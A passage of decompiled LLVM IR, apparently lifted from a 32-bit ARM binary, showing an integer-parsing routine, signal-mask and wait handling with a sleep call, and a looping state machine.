  store i32 %v2_14770, i32* @r4, align 4
  store i32 %v2_14770, i32* @r0, align 4
  store i32 6, i32* @r1, align 4
  %v0_1477c = call i32 @function_140f8()
  %v2_14780 = icmp eq i32 %v0_1477c, 0
  br i1 %v2_14780, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_14770
  store i32 %v2_14770, i32* %r1.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_14770, %bb
  store i32 83860, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_14780, i32 ptrtoint (i32* @global_var_13918.639 to i32))
  %v2_14798 = load i32, i32* @global_var_1ec8c.641, align 4
  %v2_1479c = icmp eq i32 %v2_14798, 0
  br i1 %v2_1479c, label %dec_label_pc_147a4, label %dec_label_pc_147d4

dec_label_pc_147a4:                               ; preds = %.thread1
  store i32 1, i32* @global_var_1ec8c.641, align 4
  br label %dec_label_pc_147ac

dec_label_pc_147ac:                               ; preds = %dec_label_pc_14824, %dec_label_pc_147a4
  %v1_147b8 = call i32 @function_14cd4()
  %v1_147c0 = call i32 @function_13fbc(i32 6)
  store i32 83924, i32* @lr, align 4
  %v1_147d0 = call i32 @function_14cd4()
  %v2_147d8.pre = load i32, i32* @global_var_1ec8c.641, align 4
  br label %dec_label_pc_147d4

dec_label_pc_147d4:                               ; preds = %.thread1, %dec_label_pc_147ac
  %v0_14848 = phi i32 [ %v2_14798, %.thread1 ], [ %v2_147d8.pre, %dec_label_pc_147ac ]
  store i32 ptrtoint (i32* @global_var_1ec8c.641 to i32), i32* %ip.global-to-local, align 4
  %v7_147dc = icmp eq i32 %v0_14848, 1
  br i1 %v7_147dc, label %dec_label_pc_1480c.lr.ph, label %dec_label_pc_14840

dec_label_pc_1480c.lr.ph:                         ; preds = %dec_label_pc_147d4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 140, i32* @r2, align 4
  store i32 2, i32* @global_var_1ec8c.641, align 4
  %v2_147f8 = bitcast i32* %stack_var_-268 to i8*
  %v3_147f8 = call i32 @function_13cd0(i8* %v2_147f8, i32 0)
  store i32 0, i32* %stack_var_-268, align 4
  store i32 31, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1480c

dec_label_pc_1480c:                               ; preds = %dec_label_pc_1480c.lr.ph, %dec_label_pc_1480c
  %v1_14810 = phi i32 [ 31, %dec_label_pc_1480c.lr.ph ], [ %v1_1481c, %dec_label_pc_1480c ]
  %v4_14810 = mul i32 %v1_14810, 4
  %v5_14810 = add i32 %v4_14810, %v2_14758
  %v2_14818 = add i32 %v5_14810, -264
  %v3_14818 = inttoptr i32 %v2_14818 to i32*
  store i32 -1, i32* %v3_14818, align 4
  %v0_1481c = load i32, i32* %r1.global-to-local, align 4
  %v1_1481c = add i32 %v0_1481c, -1
  store i32 %v1_1481c, i32* %r1.global-to-local, align 4
  %v6_1481c = icmp slt i32 %v1_1481c, 0
  br i1 %v6_1481c, label %dec_label_pc_14824, label %dec_label_pc_1480c

dec_label_pc_14824:                               ; preds = %dec_label_pc_1480c
  store i32 %v2_1473c, i32* %r1.global-to-local, align 4
  %v4_14838 = call i32 @function_14fc0(i32 6, i32* nonnull %stack_var_-268, i32 0)
  br label %dec_label_pc_147ac

dec_label_pc_14840:                               ; preds = %dec_label_pc_147d4
  %v7_14840 = icmp eq i32 %v0_14848, 2
  br i1 %v7_14840, label %dec_label_pc_14848, label %dec_label_pc_14854

dec_label_pc_14848:                               ; preds = %dec_label_pc_14840
  store i32 3, i32* @global_var_1ec8c.641, align 4
  %v0_14850 = call i32 @function_1473c()
  %v2_14854.pre = load i32, i32* @global_var_1ec8c.641, align 4
  br label %dec_label_pc_14854

dec_label_pc_14854:                               ; preds = %dec_label_pc_14840, %dec_label_pc_14848
  %v1_1485c = phi i32 [ %v0_14848, %dec_label_pc_14840 ], [ %v2_14854.pre, %dec_label_pc_14848 ]
  %v7_14858 = icmp eq i32 %v1_1485c, 3
  br i1 %v7_14858, label %bb27, label %.thread3

bb27:                                             ; preds = %dec_label_pc_14854
  %v2_14864 = load i32, i32* %ip.global-to-local, align 4
  %v3_14864 = inttoptr i32 %v2_14864 to i32*
  store i32 4, i32* %v3_14864, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_14854, %bb27
  call void @__pseudo_cond_branch(i1 %v7_14858, i32 ptrtoint (i32* @global_var_150d8.643 to i32))
  br label %dec_label_pc_1486c

dec_label_pc_1486c:                               ; preds = %dec_label_pc_1486c, %.thread3
  %v0_1486c = call i32 @function_1473c()
  br label %dec_label_pc_1486c

; uselistorder directives
  uselistorder i32 %v1_1481c, { 2, 1, 0 }
  uselistorder i32 %v1_14768, { 2, 1, 0 }
  uselistorder i32* %stack_var_-268, { 1, 2, 0, 3 }
  uselistorder i32* %r1.global-to-local, { 3, 4, 0, 1, 5, 6, 8, 7, 2 }
  uselistorder i32* @global_var_1ec8c.641, { 1, 2, 0, 6, 3, 4, 5 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_14854, { 1, 0 }
  uselistorder label %dec_label_pc_1480c, { 1, 0 }
  uselistorder label %dec_label_pc_147d4, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_14758, { 1, 0 }
}

define i32 @function_14884(i8* %arg1) local_unnamed_addr {
dec_label_pc_14884:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-36 = alloca i32, align 4
  %v3_14898 = load i32, i32* @r4, align 4
  store i32 %v3_14898, i32* %stack_var_-36, align 4
  store i32 0, i32* %sb.global-to-local, align 4
  store i32 10, i32* %r5.global-to-local, align 4
  store i32 1, i32* %fp.global-to-local, align 4
  %v2_148bc.pre = load i32, i32* bitcast (i32** @global_var_1ebdc.646 to i32*), align 4
  br label %dec_label_pc_148b4

dec_label_pc_148b4:                               ; preds = %dec_label_pc_148b4, %dec_label_pc_14884
  %v0_148ec = phi i32 [ %tmp, %dec_label_pc_14884 ], [ %v1_148b0, %dec_label_pc_148b4 ]
  store i32 %v0_148ec, i32* %r4.global-to-local, align 4
  %v1_148b8 = inttoptr i32 %v0_148ec to i8*
  %v2_148b8 = load i8, i8* %v1_148b8, align 1
  %v3_148b8 = zext i8 %v2_148b8 to i32
  %v3_148c0 = mul nuw nsw i32 %v3_148b8, 2
  %v4_148c0 = add i32 %v3_148c0, %v2_148bc.pre
  %v5_148c0 = inttoptr i32 %v4_148c0 to i8*
  %v6_148c0 = load i8, i8* %v5_148c0, align 1
  %v1_148c4 = and i8 %v6_148c0, 32
  %v2_148c4 = icmp eq i8 %v1_148c4, 0
  %v1_148b0 = add i32 %v0_148ec, 1
  br i1 %v2_148c4, label %dec_label_pc_148cc, label %dec_label_pc_148b4

dec_label_pc_148cc:                               ; preds = %dec_label_pc_148b4
  %v7_148cc = icmp eq i8 %v2_148b8, 43
  br i1 %v7_148cc, label %dec_label_pc_148ec, label %dec_label_pc_148d4

dec_label_pc_148d4:                               ; preds = %dec_label_pc_148cc
  %v7_148d4 = icmp eq i8 %v2_148b8, 45
  br i1 %v7_148d4, label %dec_label_pc_148ec, label %bb

bb:                                               ; preds = %dec_label_pc_148d4
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_14948

dec_label_pc_148ec:                               ; preds = %dec_label_pc_148cc, %dec_label_pc_148d4
  %storemerge30 = phi i32 [ 1, %dec_label_pc_148d4 ], [ 0, %dec_label_pc_148cc ]
  store i32 %storemerge30, i32* %r7.global-to-local, align 4
  store i32 %v1_148b0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14948

dec_label_pc_14948:                               ; preds = %bb, %dec_label_pc_148ec
  store i32 %tmp, i32* %r6.global-to-local, align 4
  %v2_14950 = call i32 @function_133f8(i32 -1, i32 10)
  %v0_14954 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_14954, i32* @r1, align 4
  store i32 -1, i32* @r0, align 4
  %v1_14960 = urem i32 %v2_14950, 256
  store i32 %v1_14960, i32* %sl.global-to-local, align 4
  %v0_14964 = call i32 @function_132e8()
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 %v0_14964, i32* %r8.global-to-local, align 4
  %v0_14978.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14978

dec_label_pc_14974:                               ; preds = %bb48, %dec_label_pc_149d4
  %v0_14974 = phi i32 [ %v1_149a4, %bb48 ], [ %v0_14974.pre, %dec_label_pc_149d4 ]
  store i32 %v0_14974, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14978

dec_label_pc_14978:                               ; preds = %dec_label_pc_14948, %dec_label_pc_14974
  %v0_149a4 = phi i32 [ %v0_14978.pre, %dec_label_pc_14948 ], [ %v0_14974, %dec_label_pc_14974 ]
  %v1_14978 = inttoptr i32 %v0_149a4 to i8*
  %v2_14978 = load i8, i8* %v1_14978, align 1
  %v3_14978 = zext i8 %v2_14978 to i32
  %v1_1497c = add nsw i32 %v3_14978, -48
  %v1_14980 = urem i32 %v1_1497c, 256
  %v1_14988 = or i32 %v3_14978, 32
  %tmp56 = icmp ult i32 %v1_14980, 10
  br i1 %tmp56, label %bb43, label %dec_label_pc_14990

dec_label_pc_14990:                               ; preds = %dec_label_pc_14978
  %tmp57 = icmp ugt i32 %v1_14988, 96
  br i1 %tmp57, label %bb42, label %bb43

bb42:                                             ; preds = %dec_label_pc_14990
  %v1_14994 = add nsw i32 %v1_14988, -87
  %v5_1499c = urem i32 %v1_14994, 256
  br label %bb43

bb43:                                             ; preds = %dec_label_pc_14978, %dec_label_pc_14990, %bb42
  %v3_149cc = phi i32 [ %v1_14980, %dec_label_pc_14978 ], [ 40, %dec_label_pc_14990 ], [ %v5_1499c, %bb42 ]
  %v1_149a0 = load i32, i32* %r5.global-to-local, align 4
  %v1_149a4 = add i32 %v0_149a4, 1
  store i32 %v1_149a4, i32* %r4.global-to-local, align 4
  %v6_149a8 = icmp slt i32 %v3_149cc, %v1_149a0
  br i1 %v6_149a8, label %dec_label_pc_149ac, label %dec_label_pc_149ec

dec_label_pc_149ac:                               ; preds = %bb43
  %v0_149ac = load i32, i32* %ip.global-to-local, align 4
  %v1_149ac = load i32, i32* %r8.global-to-local, align 4
  %v9_149ac = icmp eq i32 %v0_149ac, %v1_149ac
  br i1 %v9_149ac, label %.thread, label %bb44

.thread:                                          ; preds = %dec_label_pc_149ac
  br label %dec_label_pc_149bc

bb44:                                             ; preds = %dec_label_pc_149ac
  %v3_149ac = icmp ult i32 %v0_149ac, %v1_149ac
  br i1 %v3_149ac, label %dec_label_pc_149bc, label %dec_label_pc_149d4

dec_label_pc_149bc:                               ; preds = %bb44, %.thread
  %v4_149c41727 = phi i32 [ 1, %.thread ], [ 0, %bb44 ]
  %v1_149bc = load i32, i32* %sl.global-to-local, align 4
  %v3_149bc = icmp uge i32 %v3_149cc, %v1_149bc
  %v9_149bc = icmp eq i32 %v3_149cc, %v1_149bc
  %v2_149c0 = xor i1 %v3_149bc, true
  %v3_149c0 = or i1 %v9_149bc, %v2_149c0
  br i1 %v3_149c0, label %bb45, label %bb46

bb45:                                             ; preds = %dec_label_pc_149bc
  br label %bb46

bb46:                                             ; preds = %dec_label_pc_149bc, %bb45
  %v4_149c4 = phi i32 [ %v4_149c41727, %dec_label_pc_149bc ], [ 0, %bb45 ]
  %v2_149c4 = xor i1 %v9_149bc, true
  %v3_149c4 = and i1 %v3_149bc, %v2_149c4
  br i1 %v3_149c4, label %bb47, label %thread-pre-split

bb47:                                             ; preds = %bb46
  %v5_149c4 = urem i32 %v4_149c4, 2
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb46, %bb47
  %v0_149c8 = phi i32 [ %v5_149c4, %bb47 ], [ %v4_149c4, %bb46 ]
  %v2_149c8 = icmp eq i32 %v0_149c8, 0
  br i1 %v2_149c8, label %bb48, label %dec_label_pc_149d4

bb48:                                             ; preds = %thread-pre-split
  %v4_149cc = mul i32 %v0_149ac, %v1_149a0
  %v5_149cc = add i32 %v4_149cc, %v3_149cc
  store i32 %v5_149cc, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_14974

dec_label_pc_149d4:                               ; preds = %bb44, %thread-pre-split
  %v0_149d4 = call i32 @function_13c70()
  %v0_149d8 = load i32, i32* %r7.global-to-local, align 4
  %v1_149d8 = load i32, i32* %fp.global-to-local, align 4
  %v2_149d8 = and i32 %v1_149d8, %v0_149d8
  store i32 %v2_149d8, i32* %r7.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  %v2_149e4 = inttoptr i32 %v0_149d4 to i32*
  store i32 34, i32* %v2_149e4, align 4
  %v0_14974.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14974

dec_label_pc_149ec:                               ; preds = %bb43
  %v0_149ec.pre = load i32, i32* %sb.global-to-local, align 4
  %v2_149ec = icmp eq i32 %v0_149ec.pre, 0
  br i1 %v2_149ec, label %bb50, label %bb49

bb49:                                             ; preds = %dec_label_pc_149ec
  %v1_149f0 = load i32, i32* %r6.global-to-local, align 4
  %v3_149f0 = inttoptr i32 %v0_149ec.pre to i32*
  store i32 %v1_149f0, i32* %v3_149f0, align 4
  br label %bb50

bb50:                                             ; preds = %dec_label_pc_149ec, %bb49
  %v0_149f4 = load i32, i32* %r7.global-to-local, align 4
  %v2_149f4 = icmp eq i32 %v0_149f4, 0
  %. = select i1 %v2_149f4, i32 2147483647, i32 -2147483648
  store i32 %., i32* %r4.global-to-local, align 4
  %v0_14a00 = load i32, i32* %fp.global-to-local, align 4
  %v2_14a00 = icmp eq i32 %v0_14a00, 0
  %v0_14a24.pre.pre = load i32, i32* %ip.global-to-local, align 4
  br i1 %v2_14a00, label %dec_label_pc_14a1c, label %bb53

bb53:                                             ; preds = %bb50
  %tmp58 = icmp ugt i32 %v0_14a24.pre.pre, %.
  br i1 %tmp58, label %dec_label_pc_14a0c, label %dec_label_pc_14a1c

dec_label_pc_14a0c:                               ; preds = %bb53
  %v0_14a0c = call i32 @function_13c70()
  %v2_14a14 = inttoptr i32 %v0_14a0c to i32*
  store i32 34, i32* %v2_14a14, align 4
  %v0_14a18 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_14a18, i32* %ip.global-to-local, align 4
  %v0_14a1c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_14a1c

dec_label_pc_14a1c:                               ; preds = %bb53, %bb50, %dec_label_pc_14a0c
  %v0_14a24.pre = phi i32 [ %v0_14a24.pre.pre, %bb53 ], [ %v0_14a18, %dec_label_pc_14a0c ], [ %v0_14a24.pre.pre, %bb50 ]
  %v0_14a1c = phi i32 [ %v0_149f4, %bb53 ], [ %v0_14a1c.pre, %dec_label_pc_14a0c ], [ %v0_149f4, %bb50 ]
  %v2_14a1c = icmp eq i32 %v0_14a1c, 0
  br i1 %v2_14a1c, label %dec_label_pc_14a1c._crit_edge, label %bb54

bb54:                                             ; preds = %dec_label_pc_14a1c
  %v2_14a20 = sub i32 0, %v0_14a24.pre
  store i32 %v2_14a20, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_14a1c._crit_edge

dec_label_pc_14a1c._crit_edge:                    ; preds = %dec_label_pc_14a1c, %bb54
  %v0_14a24 = phi i32 [ %v2_14a20, %bb54 ], [ %v0_14a24.pre, %dec_label_pc_14a1c ]
  %v2_14a28 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_14a28, i32* @r4, align 4
  ret i32 %v0_14a24

; uselistorder directives
  uselistorder i32 %v0_14a24.pre, { 1, 0 }
  uselistorder i32 %v0_14a24.pre.pre, { 1, 2, 0 }
  uselistorder i32 %v0_149ec.pre, { 1, 0 }
  uselistorder i32 %v4_149c4, { 1, 0 }
  uselistorder i1 %v3_149bc, { 1, 0 }
  uselistorder i32 %v1_149bc, { 1, 0 }
  uselistorder i32 %v1_149a4, { 1, 0 }
  uselistorder i32 %v1_14988, { 1, 0 }
  uselistorder i32 %v1_14980, { 1, 0 }
  uselistorder i32 %v0_14974, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 2, 3, 1, 4, 0, 5 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 5, 6, 0, 1, 3, 2, 4 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 5, 2, 3, 4, 6 }
  uselistorder i32 ()* @function_132e8, { 3, 2, 4, 1, 0 }
  uselistorder i32 (i32, i32)* @function_133f8, { 7, 2, 1, 12, 3, 9, 5, 4, 11, 10, 8, 6, 0 }
  uselistorder i8 45, { 0, 2, 1 }
  uselistorder i8 32, { 0, 8, 14, 9, 10, 1, 11, 12, 13, 2, 3, 4, 5, 6, 7, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28 }
  uselistorder label %dec_label_pc_14a1c._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_14a1c, { 2, 0, 1 }
  uselistorder label %bb50, { 1, 0 }
  uselistorder label %dec_label_pc_149d4, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %bb43, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14978, { 1, 0 }
  uselistorder label %dec_label_pc_14974, { 1, 0 }
  uselistorder label %dec_label_pc_14948, { 1, 0 }
  uselistorder label %dec_label_pc_148ec, { 1, 0 }
}

define i32 @function_14a30(i32 %arg1) local_unnamed_addr {
dec_label_pc_14a30:
  %stack_var_-16 = alloca i32, align 4
  %v2_14a30 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg1, i32* @r4, align 4
  store i32 %v2_14a30, i32* @r0, align 4
  %v8_14a4c = call i32 @function_14cdc(i32 %v2_14a30, i32 ptrtoint (i32* @global_var_14cd4.595 to i32), i32 ptrtoint (i32* @global_var_1ebbc.649 to i32), i32 85212, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v1_14a5c = call i32 @function_14cd4()
  %v2_14a64 = load i32, i32* @global_var_1ec90.653, align 4
  %v2_14a68 = icmp eq i32 %v2_14a64, 0
  br i1 %v2_14a68, label %.thread1, label %bb

bb:                                               ; preds = %dec_label_pc_14a30
  call void @__pseudo_branch(i32 %v2_14a64)
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_14a30, %bb
  store i32 %v2_14a30, i32* @r0, align 4
  %v8_14a88 = call i32 @function_14cdc(i32 %v2_14a30, i32 1, i32 ptrtoint (i32* @global_var_1ebbc.649 to i32), i32 85212, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v8_14a88, i32* @r0, align 4
  %v1_14a8c = call i32 @function_14c68(i32 %v8_14a88)
  %v0_14aa0 = load i32, i32* @r4, align 4
  %v1_14aa4 = call i32 @function_150d8(i32 %v0_14aa0)
  unreachable

; uselistorder directives
  uselistorder i32 %v2_14a30, { 1, 0, 3, 2 }
  uselistorder i32 ()* @function_14cd4, { 4, 3, 2, 1, 18, 17, 16, 15, 14, 0, 13, 12, 11, 10, 9, 8, 7, 6, 5, 21, 20, 19 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @function_14cdc, { 1, 0, 5, 4, 3, 2 }
  uselistorder i32 85212, { 1, 0, 3, 4, 2, 5, 6, 7 }
  uselistorder i32 ptrtoint (i32* @global_var_1ebbc.649 to i32), { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_14cd4.595 to i32), { 0, 3, 1, 2 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @function_14ac4(i32 %arg1) local_unnamed_addr {
dec_label_pc_14ac4:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-424 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_14ac4 = load i32, i32* @r4, align 4
  store i32 %v3_14ac4, i32* %stack_var_-20, align 4
  %v6_14ac4 = load i32, i32* @r5, align 4
  %v9_14ac4 = load i32, i32* @r6, align 4
  %v16_14ac4 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %arg1, i32* @ip, align 4
  %v2_14ac8 = icmp eq i32 %arg1, 0
  %v2_14acc = ptrtoint i32* %stack_var_-424 to i32
  br i1 %v2_14ac8, label %dec_label_pc_14c50, label %dec_label_pc_14ae4.preheader

dec_label_pc_14ae4.preheader:                     ; preds = %dec_label_pc_14ac4
  store i32 31, i32* %r1.global-to-local, align 4
  %v5_14aec17 = add i32 %v16_14ac4, 124
  br label %dec_label_pc_14adc

dec_label_pc_14adc:                               ; preds = %dec_label_pc_14ae4.preheader, %dec_label_pc_14adc
  %v5_14aec18 = phi i32 [ %v5_14aec17, %dec_label_pc_14ae4.preheader ], [ %v5_14aec, %dec_label_pc_14adc ]
  %v2_14ae0 = add i32 %v5_14aec18, -136
  %v3_14ae0 = inttoptr i32 %v2_14ae0 to i32*
  store i32 0, i32* %v3_14ae0, align 4
  %v0_14ae4.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_14ae4 = add i32 %v0_14ae4.pre, -1
  store i32 %v1_14ae4, i32* %r1.global-to-local, align 4
  %v6_14ae4 = icmp slt i32 %v1_14ae4, 0
  %v4_14aec = mul i32 %v1_14ae4, 4
  %v5_14aec = add i32 %v4_14aec, %v16_14ac4
  br i1 %v6_14ae4, label %dec_label_pc_14af4, label %dec_label_pc_14adc

dec_label_pc_14af4:                               ; preds = %dec_label_pc_14adc
  %v2_14af4 = ptrtoint i32* %stack_var_-156 to i32
  store i32 0, i32* @r5, align 4
  store i32 %v2_14af4, i32* @r0, align 4
  store i32 17, i32* @r1, align 4
  %v0_14b04 = load i32, i32* @ip, align 4
  store i32 %v0_14b04, i32* %stack_var_-28, align 4
  %v0_14b0c = call i32 @function_140f8()
  store i32 %v0_14b0c, i32* %r0.global-to-local, align 4
  %v1_14b10 = load i32, i32* @r5, align 4
  %v5_14b14 = icmp slt i32 %v0_14b0c, %v1_14b10
  br i1 %v5_14b14, label %dec_label_pc_14c58, label %dec_label_pc_14b18

dec_label_pc_14b18:                               ; preds = %dec_label_pc_14af4
  %v2_14b18 = ptrtoint i32* %stack_var_-284 to i32
  store i32 %v2_14b18, i32* @r4, align 4
  store i32 %v1_14b10, i32* %r0.global-to-local, align 4
  store i32 %v2_14af4, i32* %r1.global-to-local, align 4
  %v3_14b28 = bitcast i32* %stack_var_-156 to %_TYPEDEF_sigset_t*
  %v4_14b28 = call i32 @function_13918(i32 %v1_14b10, %_TYPEDEF_sigset_t* %v3_14b28, i32 %v2_14b18)
  store i32 %v4_14b28, i32* %r0.global-to-local, align 4
  %v1_14b2c = load i32, i32* @r5, align 4
  %v9_14b2c = icmp eq i32 %v4_14b28, %v1_14b2c
  br i1 %v9_14b2c, label %dec_label_pc_14b34, label %dec_label_pc_14c58

dec_label_pc_14b34:                               ; preds = %dec_label_pc_14b18
  store i32 17, i32* %r1.global-to-local, align 4
  store i32 %v2_14b18, i32* %r0.global-to-local, align 4
  %v2_14b3c = call i32 @function_140d4(i32 %v2_14b18, i32 17)
  store i32 %v2_14b3c, i32* %r0.global-to-local, align 4
  %v1_14b40 = load i32, i32* @r5, align 4
  %v9_14b40 = icmp eq i32 %v2_14b3c, %v1_14b40
  br i1 %v9_14b40, label %dec_label_pc_14b58.preheader, label %dec_label_pc_14b34.dec_label_pc_14c20_crit_edge

dec_label_pc_14b34.dec_label_pc_14c20_crit_edge:  ; preds = %dec_label_pc_14b34
  %.pre = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_14c20

dec_label_pc_14b58.preheader:                     ; preds = %dec_label_pc_14b34
  store i32 31, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14b50

dec_label_pc_14b50:                               ; preds = %dec_label_pc_14b58.preheader, %dec_label_pc_14b50
  %v5_14b6016 = phi i32 [ %v5_14aec17, %dec_label_pc_14b58.preheader ], [ %v5_14b60, %dec_label_pc_14b50 ]
  %v2_14b54 = add i32 %v5_14b6016, -136
  %v3_14b54 = inttoptr i32 %v2_14b54 to i32*
  store i32 0, i32* %v3_14b54, align 4
  %v0_14b58.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_14b58 = add i32 %v0_14b58.pre, -1
  store i32 %v1_14b58, i32* %r1.global-to-local, align 4
  %v6_14b58 = icmp slt i32 %v1_14b58, 0
  %v4_14b60 = mul i32 %v1_14b58, 4
  %v5_14b60 = add i32 %v4_14b60, %v16_14ac4
  br i1 %v6_14b58, label %dec_label_pc_14b68, label %dec_label_pc_14b50

dec_label_pc_14b68:                               ; preds = %dec_label_pc_14b50
  store i32 %v2_14af4, i32* @r0, align 4
  store i32 17, i32* @r1, align 4
  %v0_14b70 = call i32 @function_140f8()
  store i32 %v0_14b70, i32* %r0.global-to-local, align 4
  %v1_14b74 = icmp slt i32 %v0_14b70, 0
  br i1 %v1_14b74, label %dec_label_pc_14c58, label %dec_label_pc_14b7c

dec_label_pc_14b7c:                               ; preds = %dec_label_pc_14b68
  store i32 17, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v4_14b88 = call i32 @function_14fc0(i32 17, i32* null, i32 %v2_14acc)
  store i32 %v4_14b88, i32* %r0.global-to-local, align 4
  %v1_14b8c = icmp slt i32 %v4_14b88, 0
  br i1 %v1_14b8c, label %dec_label_pc_14b94, label %dec_label_pc_14bbc

dec_label_pc_14b94:                               ; preds = %dec_label_pc_14b7c
  %v0_14b94 = call i32 @function_13c70()
  store i32 %v2_14b18, i32* %r1.global-to-local, align 4
  store i32 %v0_14b94, i32* %r5.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_14ba8 = inttoptr i32 %v0_14b94 to i32*
  %v2_14ba8 = load i32, i32* %v1_14ba8, align 4
  store i32 %v2_14ba8, i32* @r4, align 4
  %v3_14bac = bitcast i32* %stack_var_-284 to %_TYPEDEF_sigset_t*
  %v4_14bac = call i32 @function_13918(i32 2, %_TYPEDEF_sigset_t* %v3_14bac, i32 0)
  store i32 -1, i32* %r0.global-to-local, align 4
  %v0_14bb4 = load i32, i32* @r4, align 4
  %v1_14bb4 = load i32, i32* %r5.global-to-local, align 4
  %v2_14bb4 = inttoptr i32 %v1_14bb4 to i32*
  store i32 %v0_14bb4, i32* %v2_14bb4, align 4
  %v17_14c60.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14c5c

dec_label_pc_14bbc:                               ; preds = %dec_label_pc_14b7c
  %v2_14bbc = load i32, i32* %stack_var_-424, align 4
  %v7_14bc0 = icmp eq i32 %v2_14bbc, 1
  %v2_14bc8 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_14bc8, i32* @r4, align 4
  br i1 %v7_14bc0, label %dec_label_pc_14bd0, label %dec_label_pc_14c04

dec_label_pc_14bd0:                               ; preds = %dec_label_pc_14bbc
  store i32 %v2_14bc8, i32* %r1.global-to-local, align 4
  store i32 %v2_14bc8, i32* %r0.global-to-local, align 4
  %v2_14bd8 = bitcast i32* %stack_var_-28 to %timespec*
  %v3_14bd8 = call i32 @function_1545c(%timespec* %v2_14bd8, i32 %v2_14bc8)
  store i32 %v3_14bd8, i32* %r0.global-to-local, align 4
  store i32 %v3_14bd8, i32* %r6.global-to-local, align 4
  %v0_14be0 = call i32 @function_13c70()
  store i32 %v2_14b18, i32* %r1.global-to-local, align 4
  store i32 %v0_14be0, i32* %r5.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_14bf4 = inttoptr i32 %v0_14be0 to i32*
  %v2_14bf4 = load i32, i32* %v1_14bf4, align 4
  store i32 %v2_14bf4, i32* @r4, align 4
  %v3_14bf8 = bitcast i32* %stack_var_-284 to %_TYPEDEF_sigset_t*
  %v4_14bf8 = call i32 @function_13918(i32 2, %_TYPEDEF_sigset_t* %v3_14bf8, i32 0)
  store i32 %v4_14bf8, i32* %r0.global-to-local, align 4
  %v0_14bfc = load i32, i32* @r4, align 4
  %v1_14bfc = load i32, i32* %r5.global-to-local, align 4
  %v2_14bfc = inttoptr i32 %v1_14bfc to i32*
  store i32 %v0_14bfc, i32* %v2_14bfc, align 4
  %v0_14c2c.pr = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14c2c

dec_label_pc_14c04:                               ; preds = %dec_label_pc_14bbc
  store i32 %v2_14b18, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_14c10 = bitcast i32* %stack_var_-284 to %_TYPEDEF_sigset_t*
  %v4_14c10 = call i32 @function_13918(i32 2, %_TYPEDEF_sigset_t* %v3_14c10, i32 0)
  store i32 %v4_14c10, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14c20

dec_label_pc_14c20:                               ; preds = %dec_label_pc_14b34.dec_label_pc_14c20_crit_edge, %dec_label_pc_14c04
  %storemerge.pre-phi = phi i32 [ %.pre, %dec_label_pc_14b34.dec_label_pc_14c20_crit_edge ], [ %v2_14bc8, %dec_label_pc_14c04 ]
